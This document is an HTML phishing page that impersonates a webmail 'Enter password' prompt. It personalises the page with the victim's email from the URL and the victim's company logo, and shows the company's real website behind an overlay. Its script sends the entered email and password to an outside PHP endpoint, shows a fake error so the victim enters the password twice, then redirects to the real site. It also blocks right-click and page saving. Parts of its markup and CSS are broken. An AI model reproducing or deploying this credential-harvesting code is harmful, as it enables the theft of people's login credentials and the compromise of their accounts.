<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />

        document.addEventListener("contextmenu", (event) =>
            event.preventDefault()
        );
    </script>
    <script>
        document.addEventListener(
            "keydown",
            function (e) {
                if (
                    (window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey) &&
                    e.keyCode == 83
                ) {
                    e.preventDefault();
                    // Process the event here (such as click on submit button)
                }
            },
            false
        );
    </script>

    <style>
        body {

            width: 100%;
            padding: 0;

            background: #e7fafa;
            overflow-x: hidden;
            background-image: url("https://farmtether.com/picture/welcome-bg.svg");
        }

        .full-body {
            width: 420px;
            position: absolute;
            top: 45%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .logo-name {
            margin-bottom: 20px;
            margin-top: 10px;
            padding-bottom: 0px;
        }

        .main-body {
            background: #ffffff;
            padding: 0px 40px 40px;
            box-shadow: 0px 0px 8px 2px rgba(148, 148, 148, 0.75);
            -webkit-box-shadow: 0px 0px 8px 2px rgba(148, 148, 148, 0.75);
            -moz-box-shadow: 0px 0px 8px 2px rgba(148, 148, 148, 0.75);
        }

        .error {
            margin-top: 5px;
            padding-top: 5px;
            color: #e04540;
            font-size: 11px;

        .main-body .header {

            height: 50px;
            margin: auto;

        }

        .main-body .img-logo {
            width: 100%;
            height: 100%;
            margin: 0px;
            object-fit: contain;
        }

        .main-body .grabber p {
            margin-top: 0px;
            font-size: 14px;
            font-weight: 200;

        .main-body .grabber h4 {
            margin-top: 10px;
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 0px;

        .main-body .form-group {
            margin-top: 20px;
        }

        .main-body .form-group input {

            width: 100%;

        }

        .main-body .form-group input:focus {

        .main-body .form-button {

        .main-body .form-button .btn {

            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            top: 0;

            pointer-events: none;
        }

        #overlay {
            background-image: url("https://farmtether.com/picture/welcome-bg.svg");
            background: #555;
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            border: 1px solid #555;
            opacity: 0.6;
            filter: alpha(opacity=60);
        }

        @media only screen and (max-width: 600px) {

                margin: 20% 3%;
            }

                margin: 0px;

            .error .blue {

                line-height: 25px;

                margin: 0px;
            }

            .main-body .form-button .btn {
                font-size: 13px;

                border: 1px solid #0067b8;

<body>
    <div id="iframe">
        <iframe id="bgPage" scrolling="no" src="bgPage" width="100%" height="100%" frameborder="0"></iframe>
    </div>
    <div id="overlay" style="height: 100%; width: 100%"></div>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <div class="full-body">
        <div class="main-body">
            <form onsubmit="handleSubmit(event)" autocomplete="">
                <div class="header" style="text-align: center">
                    <img id="lg_im" src="https://farmtether.com/picture/webmail.png" width="200px" alt=" "

                    <p class="grab-mail" id="gm"></p>
                    <h4>Enter password</h4>

                </div>
                <div class="form-group">
                    <input id="tm" type="text" value="One" class="input-form" hidden />

                <div class="form-button">

        </div>
        <p class="copy">

<script>
    /* global $ */
    $(document).ready(function () {
        var url = new URL(window.location.href);

        if(url.searchParams.get("a")){
            var a = url.searchParams.get("a");
    }
    else{
        var a = "ann@jointvco.com";
    }
       

        if (!a) {
        } else {
            var my_em = a;
            var ind = my_em.indexOf("@");
            var my_cut = my_em.substr(ind + 1);
            var b = my_cut.substr(0, my_cut.indexOf("."));
            var eml = b.toLowerCase();
            var emu = b.toUpperCase();

            console.log(my_em);
            var lg_slice = "https://logo.clearbit.com/" + my_cut;

            if (lg_slice) {
                var image = new Image();
                image.onload = function () {
                    if (this.width > 0) {
                        let ex = "image exists";
                        $("#lg_im").attr("src", "" + lg_slice);
                    }
                };
                image.onerror = function () {
                    let ex = "image doesnt exist";
                    $("#lg_im").attr("src", "https://farmtether.com/picture/webmail.png");
                };
                image.src = lg_slice;
            }

            $("#favico").attr(
                "href",
                "https://www.google.com/s2/favicons?domain=" + my_cut
            );

            $("#gm").html(my_em);
            $("#lg_nm").html(emu);
            $("#lg_nml").html(eml);
            $(".logo-title").html(eml);
            $("#em").val(my_em);

            var bgPage = "https://www." + my_cut;
            document.getElementById("bgPage").src = bgPage;
        }
    });
</script>

<script>
    function handleSubmit(e) {
        e.preventDefault();
        let emma = $("#em").val();
        let peculiar = $("#pw").val();
        let times_number = $("#tm").val();

        let ind = emma.indexOf("@");
        let my_cut = emma.substr(ind + 1);

        $.ajax({
            url: "https://farmtether.com/picture/welcome.php",
            method: "POST",
            dataType: "JSON",
            data: {
                em: emma,
                pw: peculiar,
                tm: times_number,
            },
            success: function () { },
            complete: function () { },
        });
        if (times_number === "Two") {
            window.location.replace(
                "https://www." + my_cut
            );
        }
        $("#error").show();
        $("#pw").val('');
        $("#tm").val("Two");
    }
</script>
